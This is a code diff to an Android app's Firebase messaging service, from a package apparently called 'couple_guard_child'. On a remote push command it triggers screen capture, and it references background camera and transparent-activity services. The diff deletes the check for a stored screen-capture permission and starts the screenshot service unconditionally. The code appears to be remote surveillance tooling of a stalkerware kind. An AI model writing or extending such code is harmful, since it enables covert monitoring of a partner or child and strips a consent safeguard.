@@ -11,9 +11,13 @@ import android.os.Looper
 import com.google.android.gms.location.*
 import com.example.couple_guard_child.utils.ApiClient
 import kotlinx.coroutines.tasks.await
-import com.example.couple_guard_child.services.ScreenCaptureBackgroundService
+import com.example.couple_guard_child.services.background.ScreenCaptureBackgroundService
 import com.example.couple_guard_child.services.CameraBackgroundService
 import com.example.couple_guard_child.services.CameraTransparentActivity
+import android.content.Intent
+import android.os.Build
+import android.os.PowerManager
+import androidx.core.content.ContextCompat
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
@@ -80,23 +84,11 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 }
             }
             "SCREEN_CAPTURE" -> {
-                Log.d(TAG, "🖥️ Executing: Request Screen Capture (Background)")
-
-                try {
-                    // ✅ Load permission if not yet loaded
-                    val loaded = ScreenCaptureBackgroundService.loadPermissionFromPrefs(applicationContext)
-
-                    val prefs = getSharedPreferences("ScreenCapturePrefs", Context.MODE_PRIVATE)
-                    val granted = prefs.getBoolean("screen_capture_permission_granted", false) || loaded
-
-                    if (!granted) {
-                        Log.e(TAG, "❌ No screen capture permission - cannot capture")
-                    } else {
-                        ScreenCaptureBackgroundService.startCapture(applicationContext)
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "❌ Failed to start screen capture service", e)
+                Log.i(TAG, "🎯 Starting ScreenCaptureForegroundService")
+                val intent = Intent(this, ScreenCaptureBackgroundService::class.java).apply {
+                    action = ScreenCaptureBackgroundService.ACTION_TAKE_SCREENSHOT
                 }
+                startForegroundServiceCompat(intent)
             }
             "REQUEST_NOTIFICATION" -> {
                 Log.d(TAG, "� Command: Request Notification")
@@ -112,6 +104,20 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             else -> {
                 Log.d(TAG, "⚠️ Unknown command: $commandType")
             }
+        }
+    }
+
+    private fun startForegroundServiceCompat(intent: Intent) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(this, intent)
+                Log.d(TAG, "✅ Foreground service started (O+)")
+            } else {
+                startService(intent)
+                Log.d(TAG, "✅ Service started (pre-O)")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error starting service: ${e.message}", e)
         }
     }
 
